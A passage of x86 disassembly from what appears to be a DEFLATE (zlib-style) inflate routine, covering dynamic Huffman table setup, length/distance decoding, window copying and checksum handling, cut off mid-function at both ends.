   1c2cf:	add    ebx,eax
   1c2d1:	inc    DWORD PTR [ebp-0x4]
   1c2d4:	cmp    edi,0xe
   1c2d7:	jb     0x1c2b5
   1c2d9:	mov    edx,DWORD PTR [ebp+0x8]
   1c2dc:	mov    eax,ebx
   1c2de:	and    eax,0x1f
   1c2e1:	add    eax,0x101
   1c2e6:	mov    DWORD PTR [esi+0x60],eax
   1c2e9:	shr    ebx,0x5
   1c2ec:	mov    eax,ebx
   1c2ee:	and    eax,0x1f
   1c2f1:	inc    eax
   1c2f2:	shr    ebx,0x5
   1c2f5:	mov    DWORD PTR [esi+0x64],eax
   1c2f8:	mov    eax,ebx
   1c2fa:	and    eax,0xf
   1c2fd:	add    eax,0x4
   1c300:	shr    ebx,0x4
   1c303:	sub    edi,0xe
   1c306:	cmp    DWORD PTR [esi+0x60],0x11e
   1c30d:	mov    DWORD PTR [esi+0x5c],eax
   1c310:	ja     0x1c324
   1c312:	cmp    DWORD PTR [esi+0x64],0x1e
   1c316:	ja     0x1c324
   1c318:	and    DWORD PTR [esi+0x68],0x0
   1c31c:	mov    DWORD PTR [esi],0x10
   1c322:	jmp    0x1c372
   1c324:	mov    DWORD PTR [edx+0x18],0x1ed70
   1c32b:	jmp    0x1cb4d
   1c330:	cmp    DWORD PTR [ebp-0x8],0x0
   1c334:	je     0x1cba1
   1c33a:	mov    eax,DWORD PTR [ebp-0x4]
   1c33d:	movzx  eax,BYTE PTR [eax]
   1c340:	dec    DWORD PTR [ebp-0x8]
   1c343:	mov    ecx,edi
   1c345:	shl    eax,cl
   1c347:	add    ebx,eax
   1c349:	inc    DWORD PTR [ebp-0x4]
   1c34c:	add    edi,0x8
   1c34f:	cmp    edi,0x3
   1c352:	jb     0x1c330
   1c354:	mov    ecx,DWORD PTR [esi+0x68]
   1c357:	movzx  ecx,WORD PTR [ecx*2+0x7bed0]
   1c35f:	mov    eax,ebx
   1c361:	and    eax,0x7
   1c364:	mov    WORD PTR [esi+ecx*2+0x70],ax
   1c369:	inc    DWORD PTR [esi+0x68]
   1c36c:	shr    ebx,0x3
   1c36f:	sub    edi,0x3
   1c372:	mov    eax,DWORD PTR [esi+0x68]
   1c375:	cmp    eax,DWORD PTR [esi+0x5c]
   1c378:	jb     0x1c34f
   1c37a:	jmp    0x1c391
   1c37c:	mov    eax,DWORD PTR [esi+0x68]
   1c37f:	movzx  eax,WORD PTR [eax*2+0x7bed0]
   1c387:	xor    ecx,ecx
   1c389:	mov    WORD PTR [esi+eax*2+0x70],cx
   1c38e:	inc    DWORD PTR [esi+0x68]
   1c391:	cmp    DWORD PTR [esi+0x68],0x13
   1c395:	jb     0x1c37c
   1c397:	lea    eax,[esi+0x530]
   1c39d:	lea    ecx,[esi+0x6c]
   1c3a0:	mov    DWORD PTR [ecx],eax
   1c3a2:	mov    DWORD PTR [esi+0x4c],eax
   1c3a5:	lea    edx,[esi+0x2f0]
   1c3ab:	push   edx
   1c3ac:	lea    eax,[esi+0x54]
   1c3af:	push   eax
   1c3b0:	push   ecx
   1c3b1:	mov    DWORD PTR [eax],0x7
   1c3b7:	push   0x13
   1c3b9:	lea    eax,[esi+0x70]
   1c3bc:	push   eax
   1c3bd:	push   0x0
   1c3bf:	call   0x1d15c
   1c3c4:	mov    DWORD PTR [ebp-0x24],eax
   1c3c7:	test   eax,eax
   1c3c9:	je     0x1c3da
   1c3cb:	mov    eax,DWORD PTR [ebp+0x8]
   1c3ce:	mov    DWORD PTR [eax+0x18],0x1ed56
   1c3d5:	jmp    0x1cb4d
   1c3da:	and    DWORD PTR [esi+0x68],0x0
   1c3de:	mov    DWORD PTR [esi],0x11
   1c3e4:	jmp    0x1c5e0
   1c3e9:	cmp    DWORD PTR [ebp-0x8],0x0
   1c3ed:	je     0x1cba1
   1c3f3:	mov    eax,DWORD PTR [ebp-0x4]
   1c3f6:	movzx  eax,BYTE PTR [eax]
   1c3f9:	dec    DWORD PTR [ebp-0x8]
   1c3fc:	mov    ecx,edi
   1c3fe:	shl    eax,cl
   1c400:	add    ebx,eax
   1c402:	inc    DWORD PTR [ebp-0x4]
   1c405:	add    edi,0x8
   1c408:	mov    ecx,DWORD PTR [esi+0x54]
   1c40b:	xor    eax,eax
   1c40d:	inc    eax
   1c40e:	shl    eax,cl
   1c410:	mov    ecx,DWORD PTR [esi+0x4c]
   1c413:	dec    eax
   1c414:	and    eax,ebx
   1c416:	mov    eax,DWORD PTR [ecx+eax*4]
   1c419:	mov    ecx,eax
   1c41b:	shr    ecx,0x8
   1c41e:	movzx  ecx,cl
   1c421:	mov    DWORD PTR [ebp-0x20],eax
   1c424:	cmp    ecx,edi
   1c426:	ja     0x1c3e9
   1c428:	mov    ecx,eax
   1c42a:	shr    ecx,0x10
   1c42d:	cmp    cx,0x10
   1c431:	jae    0x1c47e
   1c433:	mov    ecx,eax
   1c435:	shr    ecx,0x8
   1c438:	movzx  ecx,cl
   1c43b:	jmp    0x1c45f
   1c43d:	cmp    DWORD PTR [ebp-0x8],0x0
   1c441:	je     0x1cba1
   1c447:	mov    ecx,DWORD PTR [ebp-0x4]
   1c44a:	movzx  edx,BYTE PTR [ecx]
   1c44d:	dec    DWORD PTR [ebp-0x8]
   1c450:	mov    ecx,edi
   1c452:	shl    edx,cl
   1c454:	movzx  ecx,ah
   1c457:	add    ebx,edx
   1c459:	inc    DWORD PTR [ebp-0x4]
   1c45c:	add    edi,0x8
   1c45f:	cmp    edi,ecx
   1c461:	jb     0x1c43d
   1c463:	movzx  ecx,ah
   1c466:	mov    eax,DWORD PTR [esi+0x68]
   1c469:	shr    ebx,cl
   1c46b:	sub    edi,ecx
   1c46d:	mov    cx,WORD PTR [ebp-0x1e]
   1c471:	mov    WORD PTR [esi+eax*2+0x70],cx
   1c476:	inc    DWORD PTR [esi+0x68]
   1c479:	jmp    0x1c5e0
   1c47e:	cmp    WORD PTR [ebp-0x1e],0x10
   1c483:	jne    0x1c4db
   1c485:	movzx  eax,ah
   1c488:	jmp    0x1c4a9
   1c48a:	cmp    DWORD PTR [ebp-0x8],0x0
   1c48e:	je     0x1cba1
   1c494:	mov    ecx,DWORD PTR [ebp-0x4]
   1c497:	movzx  edx,BYTE PTR [ecx]
   1c49a:	dec    DWORD PTR [ebp-0x8]
   1c49d:	mov    ecx,edi
   1c49f:	shl    edx,cl
   1c4a1:	add    ebx,edx
   1c4a3:	inc    DWORD PTR [ebp-0x4]
   1c4a6:	add    edi,0x8
   1c4a9:	lea    ecx,[eax+0x2]
   1c4ac:	cmp    edi,ecx
   1c4ae:	jb     0x1c48a
   1c4b0:	mov    ecx,eax
   1c4b2:	sub    edi,eax
   1c4b4:	mov    eax,DWORD PTR [esi+0x68]
   1c4b7:	shr    ebx,cl
   1c4b9:	test   eax,eax
   1c4bb:	je     0x1c5f1
   1c4c1:	movzx  eax,WORD PTR [esi+eax*2+0x6e]
   1c4c6:	mov    DWORD PTR [ebp-0x20],eax
   1c4c9:	mov    eax,ebx
   1c4cb:	and    eax,0x3
   1c4ce:	add    eax,0x3
   1c4d1:	shr    ebx,0x2
   1c4d4:	dec    edi
   1c4d5:	dec    edi
   1c4d6:	jmp    0x1c560
   1c4db:	cmp    WORD PTR [ebp-0x1e],0x11
   1c4e0:	movzx  edx,ah
   1c4e3:	jne    0x1c53f
   1c4e5:	jmp    0x1c506
   1c4e7:	cmp    DWORD PTR [ebp-0x8],0x0
   1c4eb:	je     0x1cba1
   1c4f1:	mov    eax,DWORD PTR [ebp-0x4]
   1c4f4:	movzx  eax,BYTE PTR [eax]
   1c4f7:	dec    DWORD PTR [ebp-0x8]
   1c4fa:	mov    ecx,edi
   1c4fc:	shl    eax,cl
   1c4fe:	add    ebx,eax
   1c500:	inc    DWORD PTR [ebp-0x4]
   1c503:	add    edi,0x8
   1c506:	lea    eax,[edx+0x3]
   1c509:	cmp    edi,eax
   1c50b:	jb     0x1c4e7
   1c50d:	mov    ecx,edx
   1c50f:	shr    ebx,cl
   1c511:	push   0xfffffffd
   1c513:	mov    eax,ebx
   1c515:	and    eax,0x7
   1c518:	add    eax,0x3
   1c51b:	shr    ebx,0x3
   1c51e:	jmp    0x1c557
   1c520:	cmp    DWORD PTR [ebp-0x8],0x0
   1c524:	je     0x1cba1
   1c52a:	mov    eax,DWORD PTR [ebp-0x4]
   1c52d:	movzx  eax,BYTE PTR [eax]
   1c530:	dec    DWORD PTR [ebp-0x8]
   1c533:	mov    ecx,edi
   1c535:	shl    eax,cl
   1c537:	add    ebx,eax
   1c539:	inc    DWORD PTR [ebp-0x4]
   1c53c:	add    edi,0x8
   1c53f:	lea    eax,[edx+0x7]
   1c542:	cmp    edi,eax
   1c544:	jb     0x1c520
   1c546:	mov    ecx,edx
   1c548:	shr    ebx,cl
   1c54a:	push   0xfffffff9
   1c54c:	mov    eax,ebx
   1c54e:	and    eax,0x7f
   1c551:	add    eax,0xb
   1c554:	shr    ebx,0x7
   1c557:	and    DWORD PTR [ebp-0x20],0x0
   1c55b:	pop    ecx
   1c55c:	sub    ecx,edx
   1c55e:	add    edi,ecx
   1c560:	mov    ecx,DWORD PTR [esi+0x64]
   1c563:	mov    edx,DWORD PTR [esi+0x68]
   1c566:	add    ecx,DWORD PTR [esi+0x60]
   1c569:	add    edx,eax
   1c56b:	cmp    edx,ecx
   1c56d:	jbe    0x1c5dc
   1c56f:	mov    eax,DWORD PTR [ebp+0x8]
   1c572:	mov    DWORD PTR [eax+0x18],0x1ed3c
   1c579:	mov    DWORD PTR [esi],0x1b
   1c57f:	cmp    DWORD PTR [esi],0x1b
   1c582:	je     0x1cb53
   1c588:	lea    eax,[esi+0x530]
   1c58e:	lea    ecx,[esi+0x6c]
   1c591:	mov    DWORD PTR [ecx],eax
   1c593:	mov    DWORD PTR [esi+0x4c],eax
   1c596:	lea    edx,[esi+0x2f0]
   1c59c:	push   edx
   1c59d:	lea    eax,[esi+0x54]
   1c5a0:	push   eax
   1c5a1:	push   ecx
   1c5a2:	push   DWORD PTR [esi+0x60]
   1c5a5:	mov    DWORD PTR [eax],0x9
   1c5ab:	lea    eax,[esi+0x70]
   1c5ae:	push   eax
   1c5af:	push   0x1
   1c5b1:	call   0x1d15c
   1c5b6:	mov    DWORD PTR [ebp-0x24],eax
   1c5b9:	test   eax,eax
   1c5bb:	je     0x1c600
   1c5bd:	mov    eax,DWORD PTR [ebp+0x8]
   1c5c0:	mov    DWORD PTR [eax+0x18],0x1ed20
   1c5c7:	jmp    0x1cb4d
   1c5cc:	mov    ecx,DWORD PTR [esi+0x68]
   1c5cf:	mov    dx,WORD PTR [ebp-0x20]
   1c5d3:	dec    eax
   1c5d4:	mov    WORD PTR [esi+ecx*2+0x70],dx
   1c5d9:	inc    DWORD PTR [esi+0x68]
   1c5dc:	test   eax,eax
   1c5de:	jne    0x1c5cc
   1c5e0:	mov    eax,DWORD PTR [esi+0x64]
   1c5e3:	add    eax,DWORD PTR [esi+0x60]
   1c5e6:	cmp    DWORD PTR [esi+0x68],eax
   1c5e9:	jb     0x1c408
   1c5ef:	jmp    0x1c57f
   1c5f1:	mov    eax,DWORD PTR [ebp+0x8]
   1c5f4:	mov    DWORD PTR [eax+0x18],0x1ed3c
   1c5fb:	jmp    0x1cb4d
   1c600:	lea    ecx,[esi+0x6c]
   1c603:	mov    eax,DWORD PTR [ecx]
   1c605:	mov    DWORD PTR [esi+0x50],eax
   1c608:	lea    edx,[esi+0x2f0]
   1c60e:	push   edx
   1c60f:	lea    eax,[esi+0x58]
   1c612:	push   eax
   1c613:	push   ecx
   1c614:	push   DWORD PTR [esi+0x64]
   1c617:	mov    DWORD PTR [eax],0x6
   1c61d:	mov    eax,DWORD PTR [esi+0x60]
   1c620:	lea    eax,[esi+eax*2+0x70]
   1c624:	push   eax
   1c625:	push   0x2
   1c627:	call   0x1d15c
   1c62c:	mov    DWORD PTR [ebp-0x24],eax
   1c62f:	test   eax,eax
   1c631:	je     0x1c642
   1c633:	mov    eax,DWORD PTR [ebp+0x8]
   1c636:	mov    DWORD PTR [eax+0x18],0x1ed0a
   1c63d:	jmp    0x1cb4d
   1c642:	mov    DWORD PTR [esi],0x12
   1c648:	cmp    DWORD PTR [ebp-0x8],0x6
   1c64c:	jb     0x1c6a5
   1c64e:	cmp    DWORD PTR [ebp-0x10],0x102
   1c655:	jb     0x1c6a5
   1c657:	mov    eax,DWORD PTR [ebp+0x8]
   1c65a:	mov    ecx,DWORD PTR [ebp-0x18]
   1c65d:	push   DWORD PTR [ebp-0x1c]
   1c660:	mov    DWORD PTR [eax+0xc],ecx
   1c663:	mov    ecx,DWORD PTR [ebp-0x10]
   1c666:	mov    DWORD PTR [eax+0x10],ecx
   1c669:	mov    ecx,DWORD PTR [ebp-0x4]
   1c66c:	mov    DWORD PTR [eax],ecx
   1c66e:	mov    ecx,DWORD PTR [ebp-0x8]
   1c671:	mov    DWORD PTR [eax+0x4],ecx
   1c674:	push   eax
   1c675:	mov    DWORD PTR [esi+0x38],ebx
   1c678:	mov    DWORD PTR [esi+0x3c],edi
   1c67b:	call   0x1cd76
   1c680:	mov    eax,DWORD PTR [ebp+0x8]
   1c683:	mov    ecx,DWORD PTR [eax+0xc]
   1c686:	mov    ebx,DWORD PTR [esi+0x38]
   1c689:	mov    edi,DWORD PTR [esi+0x3c]
   1c68c:	mov    DWORD PTR [ebp-0x18],ecx
   1c68f:	mov    ecx,DWORD PTR [eax+0x10]
   1c692:	mov    DWORD PTR [ebp-0x10],ecx
   1c695:	mov    ecx,DWORD PTR [eax]
   1c697:	mov    eax,DWORD PTR [eax+0x4]
   1c69a:	mov    DWORD PTR [ebp-0x4],ecx
   1c69d:	mov    DWORD PTR [ebp-0x8],eax
   1c6a0:	jmp    0x1cb53
   1c6a5:	mov    ecx,DWORD PTR [esi+0x54]
   1c6a8:	mov    eax,DWORD PTR [esi+0x4c]
   1c6ab:	xor    edx,edx
   1c6ad:	inc    edx
   1c6ae:	shl    edx,cl
   1c6b0:	dec    edx
   1c6b1:	and    edx,ebx
   1c6b3:	mov    eax,DWORD PTR [eax+edx*4]
   1c6b6:	jmp    0x1c6e8
   1c6b8:	cmp    DWORD PTR [ebp-0x8],0x0
   1c6bc:	je     0x1cba1
   1c6c2:	mov    eax,DWORD PTR [ebp-0x4]
   1c6c5:	movzx  eax,BYTE PTR [eax]
   1c6c8:	dec    DWORD PTR [ebp-0x8]
   1c6cb:	mov    ecx,edi
   1c6cd:	shl    eax,cl
   1c6cf:	mov    ecx,DWORD PTR [esi+0x54]
   1c6d2:	add    edi,0x8
   1c6d5:	add    ebx,eax
   1c6d7:	inc    DWORD PTR [ebp-0x4]
   1c6da:	xor    eax,eax
   1c6dc:	inc    eax
   1c6dd:	shl    eax,cl
   1c6df:	mov    ecx,DWORD PTR [esi+0x4c]
   1c6e2:	dec    eax
   1c6e3:	and    eax,ebx
   1c6e5:	mov    eax,DWORD PTR [ecx+eax*4]
   1c6e8:	mov    ecx,eax
   1c6ea:	shr    ecx,0x8
   1c6ed:	movzx  ecx,cl
   1c6f0:	cmp    ecx,edi
   1c6f2:	ja     0x1c6b8
   1c6f4:	test   al,al
   1c6f6:	je     0x1c78f
   1c6fc:	test   al,0xf0
   1c6fe:	jne    0x1c78f
   1c704:	mov    DWORD PTR [ebp-0xc],eax
   1c707:	shr    DWORD PTR [ebp-0xc],0x8
   1c70b:	movzx  edx,BYTE PTR [ebp-0xc]
   1c70f:	mov    DWORD PTR [ebp-0x28],edx
   1c712:	movzx  ecx,al
   1c715:	add    ecx,edx
   1c717:	xor    edx,edx
   1c719:	inc    edx
   1c71a:	shl    edx,cl
   1c71c:	mov    ecx,DWORD PTR [ebp-0x28]
   1c71f:	mov    DWORD PTR [ebp-0x20],eax
   1c722:	shr    eax,0x10
   1c725:	dec    edx
   1c726:	and    edx,ebx
   1c728:	shr    edx,cl
   1c72a:	add    edx,eax
   1c72c:	mov    eax,DWORD PTR [esi+0x4c]
   1c72f:	mov    eax,DWORD PTR [eax+edx*4]
   1c732:	movzx  edx,BYTE PTR [ebp-0xc]
   1c736:	jmp    0x1c779
   1c738:	cmp    DWORD PTR [ebp-0x8],0x0
   1c73c:	je     0x1cba1
   1c742:	mov    eax,DWORD PTR [ebp-0x4]
   1c745:	movzx  eax,BYTE PTR [eax]
   1c748:	movzx  edx,BYTE PTR [ebp-0x1f]
   1c74c:	dec    DWORD PTR [ebp-0x8]
   1c74f:	mov    ecx,edi
   1c751:	shl    eax,cl
   1c753:	movzx  ecx,BYTE PTR [ebp-0x20]
   1c757:	add    ebx,eax
   1c759:	inc    DWORD PTR [ebp-0x4]
   1c75c:	xor    eax,eax
   1c75e:	add    ecx,edx
   1c760:	inc    eax
   1c761:	shl    eax,cl
   1c763:	add    edi,0x8
   1c766:	mov    ecx,edx
   1c768:	dec    eax
   1c769:	and    eax,ebx
   1c76b:	shr    eax,cl
   1c76d:	movzx  ecx,WORD PTR [ebp-0x1e]
   1c771:	add    eax,ecx
   1c773:	mov    ecx,DWORD PTR [esi+0x4c]
   1c776:	mov    eax,DWORD PTR [ecx+eax*4]
   1c779:	mov    ecx,eax
   1c77b:	shr    ecx,0x8
   1c77e:	movzx  ecx,cl
   1c781:	add    ecx,edx
   1c783:	cmp    ecx,edi
   1c785:	ja     0x1c738
   1c787:	movzx  ecx,BYTE PTR [ebp-0x1f]
   1c78b:	shr    ebx,cl
   1c78d:	sub    edi,ecx
   1c78f:	mov    ecx,eax
   1c791:	shr    ecx,0x8
   1c794:	movzx  ecx,cl
   1c797:	shr    ebx,cl
   1c799:	sub    edi,ecx
   1c79b:	mov    ecx,eax
   1c79d:	shr    ecx,0x10
   1c7a0:	mov    DWORD PTR [esi+0x40],ecx
   1c7a3:	test   al,al
   1c7a5:	jne    0x1c7b2
   1c7a7:	mov    DWORD PTR [esi],0x17
   1c7ad:	jmp    0x1cb53
   1c7b2:	test   al,0x20
   1c7b4:	je     0x1c7c1
   1c7b6:	mov    DWORD PTR [esi],0xb
   1c7bc:	jmp    0x1cb53
   1c7c1:	test   al,0x40
   1c7c3:	je     0x1c7d4
   1c7c5:	mov    eax,DWORD PTR [ebp+0x8]
   1c7c8:	mov    DWORD PTR [eax+0x18],0x1ecee
   1c7cf:	jmp    0x1cb4d
   1c7d4:	movzx  eax,al
   1c7d7:	and    eax,0xf
   1c7da:	mov    DWORD PTR [esi+0x48],eax
   1c7dd:	mov    DWORD PTR [esi],0x13
   1c7e3:	mov    eax,DWORD PTR [esi+0x48]
   1c7e6:	test   eax,eax
   1c7e8:	je     0x1c823
   1c7ea:	cmp    edi,eax
   1c7ec:	jae    0x1c812
   1c7ee:	cmp    DWORD PTR [ebp-0x8],0x0
   1c7f2:	je     0x1cba1
   1c7f8:	mov    ecx,DWORD PTR [ebp-0x4]
   1c7fb:	movzx  edx,BYTE PTR [ecx]
   1c7fe:	dec    DWORD PTR [ebp-0x8]
   1c801:	mov    ecx,edi
   1c803:	shl    edx,cl
   1c805:	add    edi,0x8
   1c808:	add    ebx,edx
   1c80a:	inc    DWORD PTR [ebp-0x4]
   1c80d:	cmp    edi,DWORD PTR [esi+0x48]
   1c810:	jb     0x1c7ee
   1c812:	xor    edx,edx
   1c814:	inc    edx
   1c815:	mov    ecx,eax
   1c817:	shl    edx,cl
   1c819:	dec    edx
   1c81a:	and    edx,ebx
   1c81c:	add    DWORD PTR [esi+0x40],edx
   1c81f:	shr    ebx,cl
   1c821:	sub    edi,eax
   1c823:	mov    DWORD PTR [esi],0x14
   1c829:	mov    ecx,DWORD PTR [esi+0x58]
   1c82c:	mov    eax,DWORD PTR [esi+0x50]
   1c82f:	xor    edx,edx
   1c831:	inc    edx
   1c832:	shl    edx,cl
   1c834:	dec    edx
   1c835:	and    edx,ebx
   1c837:	mov    eax,DWORD PTR [eax+edx*4]
   1c83a:	jmp    0x1c86c
   1c83c:	cmp    DWORD PTR [ebp-0x8],0x0
   1c840:	je     0x1cba1
   1c846:	mov    eax,DWORD PTR [ebp-0x4]
   1c849:	movzx  eax,BYTE PTR [eax]
   1c84c:	dec    DWORD PTR [ebp-0x8]
   1c84f:	mov    ecx,edi
   1c851:	shl    eax,cl
   1c853:	mov    ecx,DWORD PTR [esi+0x58]
   1c856:	add    edi,0x8
   1c859:	add    ebx,eax
   1c85b:	inc    DWORD PTR [ebp-0x4]
   1c85e:	xor    eax,eax
   1c860:	inc    eax
   1c861:	shl    eax,cl
   1c863:	mov    ecx,DWORD PTR [esi+0x50]
   1c866:	dec    eax
   1c867:	and    eax,ebx
   1c869:	mov    eax,DWORD PTR [ecx+eax*4]
   1c86c:	mov    ecx,eax
   1c86e:	shr    ecx,0x8
   1c871:	movzx  ecx,cl
   1c874:	cmp    ecx,edi
   1c876:	ja     0x1c83c
   1c878:	test   al,0xf0
   1c87a:	jne    0x1c90b
   1c880:	mov    DWORD PTR [ebp-0xc],eax
   1c883:	shr    DWORD PTR [ebp-0xc],0x8
   1c887:	movzx  edx,BYTE PTR [ebp-0xc]
   1c88b:	mov    DWORD PTR [ebp-0x28],edx
   1c88e:	movzx  ecx,al
   1c891:	add    ecx,edx
   1c893:	xor    edx,edx
   1c895:	inc    edx
   1c896:	shl    edx,cl
   1c898:	mov    ecx,DWORD PTR [ebp-0x28]
   1c89b:	mov    DWORD PTR [ebp-0x20],eax
   1c89e:	shr    eax,0x10
   1c8a1:	dec    edx
   1c8a2:	and    edx,ebx
   1c8a4:	shr    edx,cl
   1c8a6:	add    edx,eax
   1c8a8:	mov    eax,DWORD PTR [esi+0x50]
   1c8ab:	mov    eax,DWORD PTR [eax+edx*4]
   1c8ae:	movzx  edx,BYTE PTR [ebp-0xc]
   1c8b2:	jmp    0x1c8f5
   1c8b4:	cmp    DWORD PTR [ebp-0x8],0x0
   1c8b8:	je     0x1cba1
   1c8be:	mov    eax,DWORD PTR [ebp-0x4]
   1c8c1:	movzx  eax,BYTE PTR [eax]
   1c8c4:	movzx  edx,BYTE PTR [ebp-0x1f]
   1c8c8:	dec    DWORD PTR [ebp-0x8]
   1c8cb:	mov    ecx,edi
   1c8cd:	shl    eax,cl
   1c8cf:	movzx  ecx,BYTE PTR [ebp-0x20]
   1c8d3:	add    ebx,eax
   1c8d5:	inc    DWORD PTR [ebp-0x4]
   1c8d8:	xor    eax,eax
   1c8da:	add    ecx,edx
   1c8dc:	inc    eax
   1c8dd:	shl    eax,cl
   1c8df:	add    edi,0x8
   1c8e2:	mov    ecx,edx
   1c8e4:	dec    eax
   1c8e5:	and    eax,ebx
   1c8e7:	shr    eax,cl
   1c8e9:	movzx  ecx,WORD PTR [ebp-0x1e]
   1c8ed:	add    eax,ecx
   1c8ef:	mov    ecx,DWORD PTR [esi+0x50]
   1c8f2:	mov    eax,DWORD PTR [ecx+eax*4]
   1c8f5:	mov    ecx,eax
   1c8f7:	shr    ecx,0x8
   1c8fa:	movzx  ecx,cl
   1c8fd:	add    ecx,edx
   1c8ff:	cmp    ecx,edi
   1c901:	ja     0x1c8b4
   1c903:	movzx  ecx,BYTE PTR [ebp-0x1f]
   1c907:	shr    ebx,cl
   1c909:	sub    edi,ecx
   1c90b:	mov    ecx,eax
   1c90d:	shr    ecx,0x8
   1c910:	movzx  ecx,cl
   1c913:	shr    ebx,cl
   1c915:	sub    edi,ecx
   1c917:	test   al,0x40
   1c919:	je     0x1c92a
   1c91b:	mov    eax,DWORD PTR [ebp+0x8]
   1c91e:	mov    DWORD PTR [eax+0x18],0x1ecd8
   1c925:	jmp    0x1cb4d
   1c92a:	mov    edx,DWORD PTR [ebp+0x8]
   1c92d:	mov    ecx,eax
   1c92f:	movzx  eax,al
   1c932:	shr    ecx,0x10
   1c935:	and    eax,0xf
   1c938:	mov    DWORD PTR [esi+0x44],ecx
   1c93b:	mov    DWORD PTR [esi+0x48],eax
   1c93e:	mov    DWORD PTR [esi],0x15
   1c944:	mov    eax,DWORD PTR [esi+0x48]
   1c947:	test   eax,eax
   1c949:	je     0x1c988
   1c94b:	cmp    edi,eax
   1c94d:	jae    0x1c976
   1c94f:	cmp    DWORD PTR [ebp-0x8],0x0
   1c953:	je     0x1cba1
   1c959:	mov    eax,DWORD PTR [ebp-0x4]
   1c95c:	movzx  eax,BYTE PTR [eax]
   1c95f:	dec    DWORD PTR [ebp-0x8]
   1c962:	mov    ecx,edi
   1c964:	shl    eax,cl
   1c966:	add    edi,0x8
   1c969:	add    ebx,eax
   1c96b:	inc    DWORD PTR [ebp-0x4]
   1c96e:	cmp    edi,DWORD PTR [esi+0x48]
   1c971:	jb     0x1c94f
   1c973:	mov    edx,DWORD PTR [ebp+0x8]
   1c976:	mov    ecx,DWORD PTR [esi+0x48]
   1c979:	xor    eax,eax
   1c97b:	inc    eax
   1c97c:	shl    eax,cl
   1c97e:	dec    eax
   1c97f:	and    eax,ebx
   1c981:	add    DWORD PTR [esi+0x44],eax
   1c984:	shr    ebx,cl
   1c986:	sub    edi,ecx
   1c988:	mov    eax,DWORD PTR [esi+0x2c]
   1c98b:	sub    eax,DWORD PTR [ebp-0x10]
   1c98e:	add    eax,DWORD PTR [ebp-0x1c]
   1c991:	cmp    DWORD PTR [esi+0x44],eax
   1c994:	jbe    0x1c9a2
   1c996:	mov    DWORD PTR [edx+0x18],0x1ecba
   1c99d:	jmp    0x1cb4d
   1c9a2:	mov    DWORD PTR [esi],0x16
   1c9a8:	cmp    DWORD PTR [ebp-0x10],0x0
   1c9ac:	je     0x1cba1
   1c9b2:	mov    eax,DWORD PTR [ebp-0x1c]
   1c9b5:	sub    eax,DWORD PTR [ebp-0x10]
   1c9b8:	mov    ecx,DWORD PTR [esi+0x44]
   1c9bb:	cmp    ecx,eax
   1c9bd:	jbe    0x1c9ec
   1c9bf:	sub    ecx,eax
   1c9c1:	mov    eax,DWORD PTR [esi+0x34]
   1c9c4:	mov    DWORD PTR [ebp-0xc],ecx
   1c9c7:	mov    ecx,DWORD PTR [esi+0x30]
   1c9ca:	cmp    DWORD PTR [ebp-0xc],ecx
   1c9cd:	jbe    0x1c9da
   1c9cf:	add    eax,DWORD PTR [esi+0x28]
   1c9d2:	sub    DWORD PTR [ebp-0xc],ecx
   1c9d5:	sub    eax,DWORD PTR [ebp-0xc]
   1c9d8:	jmp    0x1c9df
   1c9da:	sub    eax,DWORD PTR [ebp-0xc]
   1c9dd:	add    eax,ecx
   1c9df:	mov    ecx,DWORD PTR [esi+0x40]
   1c9e2:	mov    DWORD PTR [ebp-0x28],ecx
   1c9e5:	cmp    DWORD PTR [ebp-0xc],ecx
   1c9e8:	jbe    0x1c9fa
   1c9ea:	jmp    0x1c9f7
   1c9ec:	mov    eax,DWORD PTR [ebp-0x18]
   1c9ef:	sub    eax,ecx
   1c9f1:	mov    ecx,DWORD PTR [esi+0x40]
   1c9f4:	mov    DWORD PTR [ebp-0x28],ecx
   1c9f7:	mov    DWORD PTR [ebp-0xc],ecx
   1c9fa:	mov    ecx,DWORD PTR [ebp-0x10]
   1c9fd:	cmp    DWORD PTR [ebp-0xc],ecx
   1ca00:	jbe    0x1ca05
   1ca02:	mov    DWORD PTR [ebp-0xc],ecx
   1ca05:	sub    ecx,DWORD PTR [ebp-0xc]
   1ca08:	mov    DWORD PTR [ebp-0x10],ecx
   1ca0b:	mov    ecx,DWORD PTR [ebp-0x28]
   1ca0e:	sub    ecx,DWORD PTR [ebp-0xc]
   1ca11:	mov    DWORD PTR [esi+0x40],ecx
   1ca14:	mov    edx,DWORD PTR [ebp-0x18]
   1ca17:	mov    cl,BYTE PTR [eax]
   1ca19:	inc    DWORD PTR [ebp-0x18]
   1ca1c:	inc    eax
   1ca1d:	dec    DWORD PTR [ebp-0xc]
   1ca20:	mov    BYTE PTR [edx],cl
   1ca22:	jne    0x1ca14
   1ca24:	cmp    DWORD PTR [esi+0x40],0x0
   1ca28:	jne    0x1cb53
   1ca2e:	jmp    0x1ca48
   1ca30:	cmp    DWORD PTR [ebp-0x10],0x0
   1ca34:	je     0x1cba1
   1ca3a:	mov    ecx,DWORD PTR [ebp-0x18]
   1ca3d:	mov    al,BYTE PTR [esi+0x40]
   1ca40:	inc    DWORD PTR [ebp-0x18]
   1ca43:	dec    DWORD PTR [ebp-0x10]
   1ca46:	mov    BYTE PTR [ecx],al
   1ca48:	mov    DWORD PTR [esi],0x12
   1ca4e:	jmp    0x1cb53
   1ca53:	cmp    DWORD PTR [esi+0x8],0x0
   1ca57:	je     0x1cb07
   1ca5d:	cmp    edi,0x20
   1ca60:	jae    0x1ca89
   1ca62:	cmp    DWORD PTR [ebp-0x8],0x0
   1ca66:	je     0x1cba1
   1ca6c:	mov    eax,DWORD PTR [ebp-0x4]
   1ca6f:	movzx  eax,BYTE PTR [eax]
   1ca72:	dec    DWORD PTR [ebp-0x8]
   1ca75:	mov    ecx,edi
   1ca77:	shl    eax,cl
   1ca79:	add    edi,0x8
   1ca7c:	add    ebx,eax
   1ca7e:	inc    DWORD PTR [ebp-0x4]
   1ca81:	cmp    edi,0x20
   1ca84:	jb     0x1ca62
   1ca86:	mov    edx,DWORD PTR [ebp+0x8]
   1ca89:	mov    eax,DWORD PTR [ebp-0x1c]
   1ca8c:	sub    eax,DWORD PTR [ebp-0x10]
   1ca8f:	add    DWORD PTR [edx+0x14],eax
   1ca92:	add    DWORD PTR [esi+0x1c],eax
   1ca95:	mov    DWORD PTR [ebp-0x1c],eax
   1ca98:	test   eax,eax
   1ca9a:	je     0x1cac4
   1ca9c:	push   eax
   1ca9d:	mov    eax,DWORD PTR [ebp-0x18]
   1caa0:	sub    eax,DWORD PTR [ebp-0x1c]
   1caa3:	cmp    DWORD PTR [esi+0x10],0x0
   1caa7:	push   eax
   1caa8:	push   DWORD PTR [esi+0x18]
   1caab:	je     0x1cab4
   1caad:	call   0x1da04
